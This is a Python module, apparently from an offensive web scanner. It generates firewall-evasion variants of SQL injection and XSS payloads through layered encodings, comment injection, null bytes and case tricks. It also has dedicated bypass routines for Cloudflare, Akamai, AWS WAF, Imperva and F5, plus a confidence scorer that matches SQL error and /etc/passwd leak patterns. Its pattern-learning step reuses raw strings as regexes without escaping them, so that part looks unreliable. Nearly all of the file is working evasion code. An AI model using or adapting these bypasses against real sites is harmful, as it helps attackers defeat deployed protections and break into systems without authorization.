import urllib.parse
import random
import re
import logging
from collections import Counter

class WAFBypassEngine:
    """Advanced WAF bypass dengan multiple encoding techniques"""
    
    def __init__(self):
        self.encoding_techniques = [
            'double_encoding',
            'unicode_bypass',
            'case_manipulation',
            'comment_injection',
            'null_byte',
            'parameter_pollution',
            'chunked_encoding'
        ]
        
    def generate_bypass_payloads(self, base_payload):
        """Generate multiple WAF bypass variants dari base payload"""
        bypassed = []
        bypassed.append(self.double_url_encode(base_payload))
        bypassed.append(self.unicode_bypass(base_payload))
        bypassed.append(self.random_case(base_payload))
        bypassed.append(self.inject_comments(base_payload))
        bypassed.append(self.null_byte_injection(base_payload))
        bypassed.append(self.mixed_encoding(base_payload))
        bypassed.append(self.html_entity_encode(base_payload))
        bypassed.append(self.hex_encode(base_payload))
        return bypassed
    
    def double_url_encode(self, payload):
        first_encode = urllib.parse.quote(payload)
        return urllib.parse.quote(first_encode)
    
    def unicode_bypass(self, payload):
        unicode_payload = ""
        for char in payload:
            unicode_payload += f"\\u{ord(char):04x}"
        return unicode_payload
    
    def random_case(self, payload):
        result = ""
        for char in payload:
            if random.choice([True, False]):
                result += char.upper()
            else:
                result += char.lower()
        return result
    
    def inject_comments(self, payload):
        if 'UNION' in payload.upper():
            return payload.replace('UNION', 'UNION/**/').replace('SELECT', '/**/SELECT/**/')
        elif '<script>' in payload.lower():
            return payload.replace('<script>', '<scr/**/ipt>')
        return payload
    
    def null_byte_injection(self, payload):
        return payload.replace("'", "'%00").replace('"', '"%00')
    
    def mixed_encoding(self, payload):
        result = ""
        for i, char in enumerate(payload):
            if i % 2 == 0:
                result += urllib.parse.quote(char)
            else:
                result += f"%{ord(char):02x}"
        return result
    
    def html_entity_encode(self, payload):
        result = ""
        for char in payload:
            result += f"&#{ord(char)};"
        return result
    
    def hex_encode(self, payload):
        return '0x' + payload.encode().hex()
    
    def bypass_specific_waf(self, payload, waf_type):
        bypass_methods = {
            'cloudflare': self.bypass_cloudflare,
            'akamai': self.bypass_akamai,
            'aws_waf': self.bypass_aws_waf,
            'imperva': self.bypass_imperva,
            'f5': self.bypass_f5
        }
        if waf_type.lower() in bypass_methods:
            return bypass_methods[waf_type.lower()](payload)
        return payload
    
    def bypass_cloudflare(self, payload):
        return [
            payload.replace('<', '\u003c').replace('>', '\u003e'),
            payload.replace('script', 'ScRiPt').replace('alert', 'aLeRt'),
            f"{payload}/**/AND/**/1=1"
        ]
    
    def bypass_akamai(self, payload):
        return [
            payload.replace(' ', '/**/'),
            payload.replace('=', '/**/=/**/'),
            self.double_url_encode(payload)
        ]
    
    def bypass_aws_waf(self, payload):
        return [
            payload.replace('UNION', 'UNION/**/ALL'),
            payload.replace('<script>', '<svg/onload='),
            payload + chr(0x09)
        ]
    
    def bypass_imperva(self, payload):
        return [
            payload.replace(' ', '%09'),
            payload.replace('SELECT', 'SeLeCt'),
            payload + '%0a'
        ]
    
    def bypass_f5(self, payload):
        return [
            payload.replace(' ', '%20%0a'),
            payload.replace('=', '%3d'),
            self.inject_comments(payload)
        ]

class MLFalsePositiveReducer:
    """Machine Learning untuk mengurangi false positives"""
    
    def __init__(self):
        self.feature_weights = {
            'error_pattern_match': 0.25,
            'response_time_anomaly': 0.20,
            'content_length_diff': 0.15,
            'status_code_change': 0.15,
            'content_similarity': 0.15,
            'entropy_change': 0.10
        }
        self.known_false_positives = self.load_false_positive_patterns()
        self.known_true_positives = self.load_true_positive_patterns()
        
    def load_false_positive_patterns(self):
        return {
            'sqli': [r'syntax.*example\.com', r'root:x:0:0:root:/root:/bin/bash', r'mysql_fetch_array.*tutorial'],
            'xss': [r'alert\(.*\).*documentation', r'<script>.*example'],
            'lfi': [r'/etc/passwd.*demo', r'example.*configuration']
        }
    
    def load_true_positive_patterns(self):
        return {
            'sqli': [r'mysql_fetch_array\(\).*parameter 1', r'You have an error in your SQL syntax.*near', r'PostgreSQL.*ERROR.*unterminated'],
            'xss': [r'<script>(?!.*example).*</script>', r'onerror=(?!.*documentation)'],
            'lfi': [r'root:[^:]*:0:0:(?!.*example)']
        }
    
    def calculate_confidence(self, vuln_data):
        features = self.extract_features(vuln_data)
        confidence = 0.0
        for feature_name, weight in self.feature_weights.items():
            if feature_name in features:
                confidence += features[feature_name] * weight
        pattern_bonus = self.check_pattern_match(vuln_data)
        confidence += pattern_bonus
        return min(max(confidence, 0.0), 1.0)
    
    def extract_features(self, vuln_data):
        features = {}
        if 'proof' in vuln_data:
            features['error_pattern_match'] = self.score_error_pattern(str(vuln_data['proof']), vuln_data['type'])
        if 'time_diff' in vuln_data.get('evidence', {}):
            features['response_time_anomaly'] = min(vuln_data['evidence']['time_diff'] / 10.0, 1.0)
        if 'length_diff' in vuln_data.get('evidence', {}):
            features['content_length_diff'] = min(vuln_data['evidence']['length_diff'] / 1000.0, 1.0)
        if 'status_code' in vuln_data.get('evidence', {}):
            features['status_code_change'] = self.score_status_code(vuln_data['evidence']['status_code'])
        return features
    
    def score_error_pattern(self, proof, vuln_type):
        vuln_type_key = vuln_type.lower().split()[0]
        false_positive_patterns = self.known_false_positives.get(vuln_type_key, [])
        for pattern in false_positive_patterns:
            if re.search(pattern, proof, re.IGNORECASE):
                return 0.2
        true_positive_patterns = self.known_true_positives.get(vuln_type_key, [])
        matches = 0
        for pattern in true_positive_patterns:
            if re.search(pattern, proof, re.IGNORECASE):
                matches += 1
        if matches >= 2: return 0.9
        elif matches == 1: return 0.6
        else: return 0.4
    
    def score_status_code(self, status_code):
        significant_codes = {500: 0.8, 200: 0.6, 403: 0.3, 404: 0.1}
        return significant_codes.get(status_code, 0.5)
    
    def check_pattern_match(self, vuln_data):
        bonus = 0.0
        if 'contexts' in vuln_data.get('evidence', {}):
            contexts = vuln_data['evidence']['contexts']
            if any(c.get('context') == 'script' for c in contexts): bonus += 0.1
            if any(c.get('severity') == 'high' for c in contexts): bonus += 0.1
        return bonus
    
    def adaptive_learning(self, vuln_data, is_confirmed):
        if is_confirmed: self.update_true_positive_patterns(vuln_data)
        else: self.update_false_positive_patterns(vuln_data)
    
    def update_true_positive_patterns(self, vuln_data):
        vuln_type = vuln_data['type'].lower().split()[0]
        proof = str(vuln_data.get('proof', ''))
        patterns = self.extract_unique_patterns(proof)
        if vuln_type not in self.known_true_positives: self.known_true_positives[vuln_type] = []
        self.known_true_positives[vuln_type].extend(patterns)
    
    def update_false_positive_patterns(self, vuln_data):
        vuln_type = vuln_data['type'].lower().split()[0]
        proof = str(vuln_data.get('proof', ''))
        patterns = self.extract_unique_patterns(proof)
        if vuln_type not in self.known_false_positives: self.known_false_positives[vuln_type] = []
        self.known_false_positives[vuln_type].extend(patterns)
    
    def extract_unique_patterns(self, text):
        patterns = []
        error_matches = re.findall(r'(error|exception|warning)[\w\s:]{10,50}', text, re.IGNORECASE)
        patterns.extend(error_matches)
        function_matches = re.findall(r'\w+\([^\)]*\)', text)
        patterns.extend(function_matches)
        return list(set(patterns))[:5]
